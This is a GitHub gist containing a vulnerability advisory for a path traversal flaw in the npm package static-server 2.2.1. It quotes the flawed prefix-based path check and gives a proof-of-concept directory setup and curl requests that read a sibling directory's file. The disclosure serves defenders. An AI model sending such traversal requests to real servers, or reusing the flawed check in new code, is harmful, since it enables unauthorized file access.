
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F1f7021703a2065ecaf9ec9e06a3a346d)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F1f7021703a2065ecaf9ec9e06a3a346d&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F1f7021703a2065ecaf9ec9e06a3a346d) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F1f7021703a2065ecaf9ec9e06a3a346d&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@lirantal](https://avatars.githubusercontent.com/u/316371?s=64&v=4)](/lirantal)

# [lirantal](/lirantal)/**[path-traversal-in-static-server.md](/lirantal/1f7021703a2065ecaf9ec9e06a3a346d)** Secret

Created
May 7, 2023 15:46

Show Gist options

* [Download ZIP](/lirantal/1f7021703a2065ecaf9ec9e06a3a346d/archive/cf486497e91bdb44f7cf1d3d01a6d67b170546f5.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F1f7021703a2065ecaf9ec9e06a3a346d)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F1f7021703a2065ecaf9ec9e06a3a346d)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/lirantal/1f7021703a2065ecaf9ec9e06a3a346d.js&quot;&gt;&lt;/script&gt;
* Save lirantal/1f7021703a2065ecaf9ec9e06a3a346d to your computer and use it in GitHub Desktop.

[Code](/lirantal/1f7021703a2065ecaf9ec9e06a3a346d)
[Revisions
1](/lirantal/1f7021703a2065ecaf9ec9e06a3a346d/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/lirantal/1f7021703a2065ecaf9ec9e06a3a346d.js&quot;&gt;&lt;/script&gt;

Save lirantal/1f7021703a2065ecaf9ec9e06a3a346d to your computer and use it in GitHub Desktop.

[Download ZIP](/lirantal/1f7021703a2065ecaf9ec9e06a3a346d/archive/cf486497e91bdb44f7cf1d3d01a6d67b170546f5.zip)

Path traversal vulnerability in static-server@2.2.1

 [Raw](/lirantal/1f7021703a2065ecaf9ec9e06a3a346d/raw/cf486497e91bdb44f7cf1d3d01a6d67b170546f5/path-traversal-in-static-server.md)

[**path-traversal-in-static-server.md**](#file-path-traversal-in-static-server-md)

# Path traversal vulnerability in static-server@2.2.1

`static-server` is a local HTTP file server, or as is it describes itself:

```
A simple http server to serve static resource files from a local directory.

```

Observation:

* It has 40,055 weekly downloads to the time of this advisory
* It was last published 5 years ago
* The source code repository on GitHub is archived

Resources:

* Project's GitHub source code: <https://github.com/nbluis/static-server>
* Project's npm package: <https://www.npmjs.com/package/static-server>

## Background on exploitation

The `static-server` npm package is joining paths from users to the root directory
and assert for the path accessed being relative to that of the root directory,
however this last case is where this is implemented in a vulnerable way:

(Starting with line 140-142](<https://github.com/nbluis/static-server/blob/master/server.js#LL140C1-L143C1>) in `server.js`,
just joins the paths:

```
    var uri = req.path = decodeURIComponent(url.parse(req.url).pathname);
    var filename = path.join(server.rootPath, uri);
```

and then a code in a utility function at [Lines 218](https://github.com/nbluis/static-server/blob/master/server.js#L218-L223)
of `server.js` attempts to jail it to the specific
root directory:

```
function validPath(rootPath, file) {
  var resolvedPath = path.resolve(rootPath, file);

  // only if we are still in the rootPath of the static site
  return resolvedPath.indexOf(rootPath) === 0;
}
```

However, it is a flawed assertion.

This vulnerability should probably be classified as a
[CWE-22](https://cwe.mitre.org/data/definitions/22.html): Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').

## Proof of Concept exploit

1. Install the latest version of `static-server`: `npm install static-server@2.2.1`
2. Make sure you have a `public/` directory with files in it
3. Make sure you have a `public-isprivate` directory with files in it
4. Make sure you have a `private/` directory with files in it

All directories above should share the same relative parent, meaning the
directory structure should look as follows:

```
.
├── private
│   └── index.html
├── public
│   └── index.html
└── public-isprivate
    └── index.html

```

Then, run a server powered by `static-server` as follows:

```
var StaticServer = require('static-server');
var server = new StaticServer({
  rootPath: 'public',            // required, the root of the server file tree
  name: 'my-http-server',   // optional, will set "X-Powered-by" HTTP header
  port: 3000,               // optional, defaults to a random port
  host: '0.0.0.0',       // optional, defaults to any interface
  cors: '*',                 // optional, defaults to undefined
  followSymlink: true,      // optional, defaults to a 404 error
  templates: {
    index: 'foo.html',      // optional, defaults to 'index.html'
    notFound: '404.html'    // optional, defaults to undefined
  }
});

server.start(function () {
  console.log('Server listening to', server.port);
});
```

(or you can simply just run it as an executable from the `public/` directory
we created)

which sets the public root directory to the `public/`
directory that we previously created:

The server should run within the local folder where all `private/`, `public/`,
and `public-isprivate` are subfolders.

Next, verify the following:

1. `curl --path-as-is "http://localhost:3000/../private/index.html"` -> this request is denied,
   as expected with prior vulnerability fix.
2. `curl --path-as-is "http://localhost:3000/../public/index.html"` -> this request is allowed,
   as expected with the functionality of this local http server
3. `curl --path-as-is "http://localhost:3000/../public-isprivate/index.html"` -> this request
   SHOULD BE DENIED because it is outside the `public/` folder, but it is actually allowed.

Case (3) shouldn't happen, but it does, due to an improper fix in the library's source code.

# Author

Liran Tal

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F1f7021703a2065ecaf9ec9e06a3a346d)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

